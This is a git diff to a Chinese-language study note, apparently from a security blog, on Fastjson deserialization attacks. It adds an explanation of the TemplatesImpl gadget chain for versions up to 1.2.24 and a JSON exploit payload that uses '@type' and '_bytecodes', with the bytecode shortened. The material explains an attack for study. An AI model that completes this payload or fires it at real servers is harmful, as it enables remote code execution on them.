@@ -32,11 +32,14 @@ title: Fastjson
 - 返回值类型继承自Collection \|\| Map \|\| AtomicBoolean \|\| AtomicInteger \|\| AtomicLong
 - 属性为私有属性，此属性没有`setter()`
 
-## 小结
+## 总结
 
-- @type可以指定反序列化成服务器上的任意类
-- 然后服务端会解析这个类，提取出这个类中符合要求的setter方法与getter方法（如setxxx）
-- 如果传入json字符串的键值中存在这个值（如xxx)，就会去调用执行对应的setter、getter方法（即setxxx方法、getxxx方法）
+- 1. @type可以指定反序列化成服务器上的任意类
+  2. 然后服务端会解析这个类，提取出这个类中符合要求的setter方法与getter方法（如setxxx）
+  3. 如果传入json字符串的键值中存在这个值（如xxx)，就会去调用执行对应的setter、getter方法（即setxxx方法、getxxx方法）
+- fastjson 在为类属性寻找 get/set 方法时，调用函数 `com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()` 方法，会忽略 `_|-` 字符串，也就是说哪怕你的字段名叫 `_a_g_e_`，getter 方法为 `getAge()`，fastjson 也可以找得到，在 1.2.36 版本及后续版本还可以支持同时使用 `_` 和 `-` 进行组合混淆。
+- 在反序列化时想给 **私有属性** 赋值，则需要使用 `Feature.SupportNonPublicField` 参数。
+- fastjson 在反序列化时，如果 Field 类型为 `byte[]`，将会调用`com.alibaba.fastjson.parser.JSONScanner#bytesValue` 进行 base64 解码，对应的，在序列化时也会进行 base64 编码。
 
 ## <=1.2.24 JNDI注入利用链
 
@@ -74,7 +77,54 @@ JdbcRowSetImpl_inc.setAutoCommit(true);
 
 ## <=1.2.24 JDK1.7 TemplatesImpl
 
+TemplatesImpl我们在CC2和7u21都见过了，其代码执行的调用链：
 
+```
+TemplatesImpl.getOutputProperties()
+  TemplatesImpl.newTransformer()
+    TemplatesImpl.getTransletInstance()
+        TemplatesImpl.defineTransletClasses()
+            TransletClassLoader.defineClass()
+```
+
+触发函数：`TemplatesImpl.getOutputProperties()`
+
+```java
+public synchronized Properties getOutputProperties() {
+    try {
+        return newTransformer().getOutputProperties();
+    }
+    catch (TransformerConfigurationException e) {
+        return null;
+    }
+}
+```
+
+满足『 **特殊**的getter 』所有的需求。
+
+构造：
+
+```json
+{
+	"@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+	"_bytecodes": ["yv66vgAAADQA...CJAAk="],
+	"_name": "theoyu",
+	"_tfactory": {},
+	"_outputProperties": {},
+}
+```
+
+之前要求`"_tfactory"`需要是**TemplatesImpl**实例对象，为什么这里为空？
+
+对成员变量内容进行解析时，如果为空，则会自动创建一个该成员字段默认的实例对象。
+
+```java
+private transient TransformerFactoryImpl _tfactory = null;
+```
+
+解析自动创建了`TransformerFactoryImpl`实例对象，所以传空字段也是可以的。
+
+![image-20220302213738301](../../assets/images/image-20220302213738301.png)
 
 ## 后续 
 
